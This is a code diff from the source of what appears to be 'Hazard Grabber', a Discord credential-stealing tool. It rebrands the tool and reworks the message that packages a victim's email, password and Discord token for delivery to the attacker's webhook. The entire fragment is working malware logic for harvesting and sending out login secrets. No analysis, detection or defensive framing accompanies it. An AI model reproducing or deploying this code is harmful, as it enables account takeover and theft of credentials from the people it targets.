@@ -144,35 +144,30 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "stenko",
+            username: "Hazard Grabber",
             content: "",
-            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
+            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " email",
-                            "value": ` - ${email}`,
+                            "name": "**Account Info**",
+                            "value": `Email: ${email} - Password: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": " password",
-                            "value": ` - ${password}`,
-                            "inline": true
-                        },
-                        {
-                            "name": " token",
-                            "value": ` - \`${token}\``,
+                            "name": "**Token**",
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
                     "author": {
-                        "name": json.username + "#" + json.discriminator + "・" + json.id,
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": ""
+                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                     }
                 }
             ]
